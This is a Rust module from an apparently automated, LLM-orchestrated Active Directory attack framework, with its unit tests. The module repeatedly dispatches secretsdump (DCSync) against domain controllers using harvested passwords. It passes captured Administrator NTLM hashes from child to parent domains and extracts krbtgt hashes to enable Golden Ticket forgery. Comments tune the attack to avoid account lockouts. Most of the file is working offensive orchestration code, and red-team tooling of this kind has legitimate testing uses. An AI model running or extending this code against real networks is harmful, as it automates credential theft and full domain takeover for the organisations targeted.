//! auto_local_admin_secretsdump -- secretsdump with admin creds.

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Check if a DC domain is a valid secretsdump target for a given credential domain.
/// Allows same domain, child domain, or parent domain.
fn is_valid_secretsdump_target(dc_domain: &str, cred_domain: &str) -> bool {
    let d = dc_domain.to_lowercase();
    let c = cred_domain.to_lowercase();
    d == c || d.ends_with(&format!(".{c}")) || c.ends_with(&format!(".{d}"))
}

/// Check if a child domain is a child of a parent domain for PTH escalation.
fn is_child_of(child: &str, parent: &str) -> bool {
    let c = child.to_lowercase();
    let p = parent.to_lowercase();
    c != p && c.ends_with(&format!(".{p}"))
}

/// Build secretsdump dedup key.
fn secretsdump_dedup_key(ip: &str, domain: &str, username: &str) -> String {
    format!(
        "{}:{}:{}",
        ip,
        domain.to_lowercase(),
        username.to_lowercase()
    )
}

/// Build PTH secretsdump dedup key.
fn pth_secretsdump_dedup_key(dc_ip: &str, parent_domain: &str) -> String {
    format!("{}:{}:pth_admin", dc_ip, parent_domain)
}

/// Build krbtgt-extraction dedup key. Distinct from the generic PTH key
/// (which is for full domain dumps) so a prior full-dump failure doesn't
/// block the narrower `-just-dc-user krbtgt` attempt against the same DC.
fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
    format!("{}:{}:krbtgt_extraction", dc_ip, domain.to_lowercase())
}

/// Find a usable Administrator NTLM hash for a domain.
fn select_administrator_hash(state: &StateInner, domain: &str) -> Option<String> {
    let dom = domain.to_lowercase();
    state
        .hashes
        .iter()
        .find(|h| {
            h.username.eq_ignore_ascii_case("administrator")
                && h.hash_type.eq_ignore_ascii_case("NTLM")
                && h.domain.to_lowercase() == dom
        })
        .map(|h| h.hash_value.clone())
}

/// True when we already have a krbtgt hash for the domain (so the GT step is
/// unblocked and we don't need to re-run DCSync against the DC).
fn has_krbtgt_hash(state: &StateInner, domain: &str) -> bool {
    let dom = domain.to_lowercase();
    state.hashes.iter().any(|h| {
        h.username.eq_ignore_ascii_case("krbtgt")
            && h.hash_type.eq_ignore_ascii_case("NTLM")
            && h.domain.to_lowercase() == dom
    })
}

/// Dispatches secretsdump when admin credentials are detected.
/// Interval: 30s. Matches Python `_auto_local_admin_secretsdump`.
pub async fn auto_local_admin_secretsdump(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Strategy gate: skip if secretsdump is excluded.
        if !dispatcher.is_technique_allowed("secretsdump") {
            continue;
        }

        // Collect credentials with passwords + target DCs.
        // Do NOT gate on is_admin — the credential may have admin rights we
        // haven't confirmed yet. Secretsdump will fail fast if it lacks
        // privileges, but when it succeeds it's the fastest path to krbtgt.
        // IMPORTANT: only target DCs in the credential's domain (or child
        // domains). Cross-domain secretsdump attempts generate failed auths
        // that trigger AD account lockout.
        let work: Vec<(String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;
            let creds: Vec<_> = state
                .credentials
                .iter()
                .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                // Skip delegation accounts — secretsdump will always fail
                // (non-admin) and wastes auth budget reserved for S4U.
                .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
                .cloned()
                .collect();

            let mut items = Vec::new();
            for cred in &creds {
                for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
                    if is_valid_secretsdump_target(dc_domain, &cred.domain) {
                        let dedup = secretsdump_dedup_key(dc_ip, &cred.domain, &cred.username);
                        if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                            items.push((dedup, dc_ip.clone(), cred.clone()));
                        }
                    }
                }
            }
            items
        };

        for (dedup_key, dc_ip, cred) in work.into_iter().take(3) {
            let priority = if cred.is_admin { 2 } else { 5 };
            match dispatcher
                .request_secretsdump(&dc_ip, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, dc = %dc_ip, user = %cred.username, "Admin secretsdump dispatched");
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&cred.domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch secretsdump"),
            }
        }

        // Hash-based secretsdump: when we dominate a child domain, use the
        // Administrator NTLM hash to PTH against parent domain DCs.
        // This covers child-to-parent escalation (e.g. child.contoso.local
        // → contoso.local) where password-based creds won't have admin
        // rights on the parent DC.
        // Strategy gate: skip dc_secretsdump if excluded.
        if !dispatcher.is_technique_allowed("dc_secretsdump") {
            continue;
        }

        let hash_work: Vec<(String, String, String, String, String)> = {
            let state = dispatcher.state.read().await;
            let mut items = Vec::new();
            for dominated in &state.dominated_domains {
                let dom = dominated.to_lowercase();
                // Find parent domain DCs: domains where the child ends with ".{parent}"
                for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
                    if is_child_of(&dom, dc_domain) {
                        // Find Administrator NTLM hash from the dominated child domain
                        if let Some(hash) = state.hashes.iter().find(|h| {
                            h.username.to_lowercase() == "administrator"
                                && h.hash_type.to_uppercase() == "NTLM"
                                && h.domain.to_lowercase() == dom
                        }) {
                            let parent = dc_domain.to_lowercase();
                            let dedup = pth_secretsdump_dedup_key(dc_ip, &parent);
                            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                                items.push((
                                    dedup,
                                    dc_ip.clone(),
                                    hash.domain.clone(),
                                    hash.hash_value.clone(),
                                    parent,
                                ));
                            }
                        }
                    }
                }
            }
            items
        };

        for (dedup_key, dc_ip, hash_domain, hash_value, parent_domain) in
            hash_work.into_iter().take(2)
        {
            let priority = dispatcher.effective_priority("dc_secretsdump");
            match dispatcher
                .request_secretsdump_hash(
                    &dc_ip,
                    "Administrator",
                    &hash_domain,
                    &hash_value,
                    priority,
                    None,
                )
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %dc_ip,
                        hash_domain = %hash_domain,
                        "PTH secretsdump dispatched against parent DC"
                    );
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&parent_domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch PTH secretsdump"),
            }
        }
    }
}

/// Dispatches a narrowed `secretsdump -just-dc-user krbtgt` whenever we hold
/// an Administrator NTLM hash for a domain but haven't yet captured that
/// domain's krbtgt hash. This closes the gap between "DA captured" and
/// "Golden Ticket forged": `auto_local_admin_secretsdump` only fires the PtH
/// path on child→parent escalation (gated on `dominated_domains`), and the
/// generic credential_access prompt lets the LLM omit `-just-dc-user`, which
/// triggers full-dump DRSUAPI hardening rejections and frequent
/// STATUS_LOGON_FAILURE on cross-realm syntax mistakes. Once krbtgt lands,
/// `auto_golden_ticket` takes over.
///
/// Priority 1 so it dominates the deferred-queue score ordering — the
/// existing soft/hard throttle caps still apply, but among queued work this
/// step jumps to the front.
pub async fn auto_krbtgt_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("dc_secretsdump") {
            continue;
        }

        let work: Vec<(String, String, String, String)> = {
            let state = dispatcher.state.read().await;
            let mut items = Vec::new();
            for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
                let dom = dc_domain.to_lowercase();
                if has_krbtgt_hash(&state, &dom) {
                    continue;
                }
                let Some(hash) = select_administrator_hash(&state, &dom) else {
                    continue;
                };
                let dedup = krbtgt_extraction_dedup_key(dc_ip, &dom);
                if state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                    continue;
                }
                items.push((dedup, dc_ip.clone(), dom, hash));
            }
            items
        };

        for (dedup_key, dc_ip, domain, hash_value) in work.into_iter().take(2) {
            match dispatcher
                .request_secretsdump_hash(
                    &dc_ip,
                    "Administrator",
                    &domain,
                    &hash_value,
                    1,
                    Some("krbtgt"),
                )
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %dc_ip,
                        domain = %domain,
                        "krbtgt extraction dispatched (just-dc-user krbtgt)"
                    );
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch krbtgt extraction"),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn valid_secretsdump_target_same_domain() {
        assert!(is_valid_secretsdump_target(
            "contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_case_insensitive() {
        assert!(is_valid_secretsdump_target(
            "CONTOSO.LOCAL",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_dc_is_child() {
        assert!(is_valid_secretsdump_target(
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_dc_is_parent() {
        assert!(is_valid_secretsdump_target(
            "contoso.local",
            "child.contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_unrelated_rejected() {
        assert!(!is_valid_secretsdump_target(
            "fabrikam.local",
            "contoso.local"
        ));
    }

    #[test]
    fn valid_secretsdump_target_empty_strings() {
        assert!(is_valid_secretsdump_target("", ""));
    }

    #[test]
    fn valid_secretsdump_target_one_empty() {
        assert!(!is_valid_secretsdump_target("contoso.local", ""));
    }

    #[test]
    fn is_child_of_basic() {
        assert!(is_child_of("child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_case_insensitive() {
        assert!(is_child_of("CHILD.CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_child_of_deeply_nested() {
        assert!(is_child_of("deep.child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_same_domain_rejected() {
        assert!(!is_child_of("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_parent_not_child() {
        assert!(!is_child_of("contoso.local", "child.contoso.local"));
    }

    #[test]
    fn is_child_of_unrelated_rejected() {
        assert!(!is_child_of("fabrikam.local", "contoso.local"));
    }

    #[test]
    fn is_child_of_empty_strings() {
        assert!(!is_child_of("", ""));
    }

    #[test]
    fn secretsdump_dedup_key_basic() {
        assert_eq!(
            secretsdump_dedup_key("192.168.58.1", "contoso.local", "Administrator"),
            "192.168.58.1:contoso.local:administrator"
        );
    }

    #[test]
    fn secretsdump_dedup_key_lowercases() {
        assert_eq!(
            secretsdump_dedup_key("192.168.58.1", "CONTOSO.LOCAL", "ADMIN"),
            "192.168.58.1:contoso.local:admin"
        );
    }

    #[test]
    fn secretsdump_dedup_key_empty_fields() {
        assert_eq!(secretsdump_dedup_key("", "", ""), "::");
    }

    #[test]
    fn pth_secretsdump_dedup_key_basic() {
        assert_eq!(
            pth_secretsdump_dedup_key("192.168.58.1", "contoso.local"),
            "192.168.58.1:contoso.local:pth_admin"
        );
    }

    #[test]
    fn pth_secretsdump_dedup_key_preserves_ip() {
        let key = pth_secretsdump_dedup_key("192.168.58.100", "contoso.local");
        assert!(key.starts_with("192.168.58.100:"));
    }

    #[test]
    fn pth_secretsdump_dedup_key_empty_fields() {
        assert_eq!(pth_secretsdump_dedup_key("", ""), "::pth_admin");
    }
}
